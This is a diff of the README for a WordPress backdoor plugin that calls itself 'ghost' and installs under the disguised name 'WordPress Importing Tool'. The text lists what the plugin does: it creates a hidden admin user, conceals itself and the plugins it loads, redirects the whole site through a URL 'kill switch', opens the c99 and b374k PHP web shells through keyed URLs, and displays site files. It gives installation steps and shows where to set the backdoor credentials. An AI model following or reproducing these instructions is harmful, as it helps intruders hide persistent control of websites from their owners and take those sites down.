@@ -12,22 +12,22 @@
 
 This plugin does the following:
 * Creates a ghost admin user
-* Installs all plugins in the ./plugins/ folder.
-* Hides said ghost admin user from the WordPress backend area
-* Hides the ghost plugin and all plugins loaded by ghost
+* Installs any additional plugins from the included ./plugins/ folder
+* Hides said ghost admin user in the WordPress backend area
+* Hides the backend plugin and any additional plugins loaded by it
 * Hides plugin and user counters
-* Adds a "kill switch” feature that redirects all pages to "bummersauce.com"
-* Adds a method to access the c99 & b374k PHP shells via URL
+* Adds a "kill switch” feature that, if activated via URL, redirects all pages to "bummersauce.com"
+* Adds a method to access the c99 and b374k PHP shells via URL
 
 # Installation
 
-1. Download the latest release of ghost here: 
+1. Download the latest release of ghost backend plugin here: 
     * https://github.com/cleancoded/ghost-backdoor-wordpress/
-2. Modify ghost plugin as needed. 
-    * The backdoor username, password and key are all stored in the __construct() method of the ghost plugin. 
-    * Search for `$this->username =`, `$this->password =`, and `$this->key =` to find the values that need to be updated. 
-3. Upload plugin files to the `/wp-content/plugins/wp-default/` directory (create this if it does exist), or install the plugin through the plugins area of the WordPress backend if you want to keep defaults.
-4. Activate the plugin through the 'Plugins' area of the WordPress backend.  It is called `WordPress Importing Tool`
+2. Modify ghost backend plugin as needed. 
+    * The backdoor username, password and key are all stored in the __construct() method of the ghost backend plugin. 
+    * Search for `$this->username =`, `$this->password =`, and `$this->key =` to find the values to be updated. 
+3. Upload additional plugin files to the `/wp-content/plugins/wp-default/` directory (create this if it does exist), or install the plugin through the plugins area of the WordPress backend if you want to keep defaults.
+4. Activate the plugin through the 'Plugins' area of the WordPress backend. It is called `WordPress Importing Tool`
 5. Login as the newly created ghost user.
 
 # Frequently Asked Questions
@@ -44,10 +44,10 @@ This plugin does the following:
         * http://localhost.com/loadshell-c99-a9J4dquMy3Qw7dvwN4yMvVm68K
     * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.
 
-* **How do I use the killsite/killswitch feature?**
+* **How do I use the killsite feature?**
     * To kill the website, http://localhost.com for example, navigate to this url:
         * http://localhost.com/killsite-a9J4dquMy3Qw7dvwN4yMvVm68K
-    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.
+    * The pattern for this is `killsite-(KEY)`.
 
 * **How do I view site files using the displayfile feature?**
     * The function accepts base64 encoded filenames.
